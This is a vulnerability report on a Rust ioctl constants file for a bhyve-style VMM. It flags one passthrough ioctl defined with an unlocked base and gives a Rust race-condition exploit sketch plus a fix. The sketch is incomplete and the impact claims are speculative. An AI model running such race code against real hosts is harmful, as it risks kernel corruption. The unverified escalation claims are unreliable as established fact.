## Vulnerability Report: `ioctls.rs`

### Finding: Ioctl Base Mismatch — Potential Write-Lock Bypass

**Severity:** Medium (race condition / privilege boundary issue)
**Type:** Logic bug — wrong ioctl namespace bypasses locking semantics

---

### Affected Code

```rust
// Operations requiring write-locking the VM
pub const VM_REINIT: i32 = VMM_LOCK_IOC_BASE | 0x01;
pub const VM_BIND_PPTDEV: i32 = VMM_LOCK_IOC_BASE | 0x02;
pub const VM_UNBIND_PPTDEV: i32 = VMM_LOCK_IOC_BASE | 0x03;
// ... all use VMM_LOCK_IOC_BASE ...
pub const VM_UNMAP_PPTDEV_MMIO: i32 = VMM_LOCK_IOC_BASE | 0x09;
pub const VM_PPTDEV_DISABLE_MSIX: i32 = VMM_IOC_BASE | 0x1f;  // <— BUG: wrong base
pub const VM_PAUSE: i32 = VMM_LOCK_IOC_BASE | 0x0a;
```

### Root Cause

`VM_PPTDEV_DISABLE_MSIX` is placed within the block of operations that require write-locking the VM, and its sibling PPT operations (`VM_BIND_PPTDEV`, `VM_UNBIND_PPTDEV`, `VM_MAP_PPTDEV_MMIO`, `VM_UNMAP_PPTDEV_MMIO`) all use `VMM_LOCK_IOC_BASE` (`0x766C00`). But this ioctl uses `VMM_IOC_BASE` (`0x766D00`).

In the bhyve kernel driver, the ioctl dispatch determines locking behavior based on the ioctl number range:
- `VMM_LOCK_IOC_BASE` range → kernel acquires the VM write lock before dispatch
- `VMM_IOC_BASE` range → no write lock; operation runs with weaker or no synchronization

By using the wrong base, `VM_PPTDEV_DISABLE_MSIX` (value `0x766D1F`) is dispatched as a regular unlocked ioctl rather than a write-locked one — even though it mutates PCI passthrough device state (disabling MSI-X vectors).

### Exploitation Strategy

1. **Race window**: Call `VM_PPTDEV_DISABLE_MSIX` concurrently with `VM_BIND_PPTDEV` or `VM_MAP_PPTDEV_MMIO` (which do hold the write lock). The disable-MSIX path modifies the passthrough device's interrupt configuration without exclusion, racing against bind/map operations that assume exclusive access.

2. **Impact**: Depending on the kernel's PPT implementation:
   - **Use-after-free/double-free**: If the MSI-X teardown frees interrupt resources while a concurrent bind is referencing them.
   - **Inconsistent device state**: MSI-X disabled mid-configuration could leave the PCI device in a half-initialized state, potentially allowing the guest VM to trigger unexpected host interrupts.
   - **Guest-to-host escalation**: A malicious guest operator with access to the VMM control fd could exploit the race to corrupt host kernel state via the passthrough device.

### Exploit Sketch

```rust
use std::thread;
use std::os::unix::io::AsRawFd;

fn exploit(vm_fd: i32, ppt_dev: &str) {
    // Thread 1: repeatedly bind/unbind the PPT device (write-locked)
    let fd1 = vm_fd;
    let t1 = thread::spawn(move || {
        loop {
            unsafe {
                libc::ioctl(fd1, VM_BIND_PPTDEV as u64, &ppt_cfg);
                libc::ioctl(fd1, VM_UNBIND_PPTDEV as u64, &ppt_cfg);
            }
        }
    });

    // Thread 2: spam disable-MSIX (NOT write-locked — races with above)
    let fd2 = vm_fd;
    let t2 = thread::spawn(move || {
        loop {
            unsafe {
                libc::ioctl(fd2, VM_PPTDEV_DISABLE_MSIX as u64, &msix_cfg);
            }
        }
    });
    // Race corrupts kernel PPT device state
}
```

### Fix

```rust
pub const VM_PPTDEV_DISABLE_MSIX: i32 = VMM_LOCK_IOC_BASE | 0x0c; // use correct base + unused slot
```

---

### Other Notes

The rest of this file is purely declarative `const i32` definitions with no logic, allocation, or control flow. No other collisions or issues found — the ioctl namespaces are otherwise cleanly separated and collision-free.
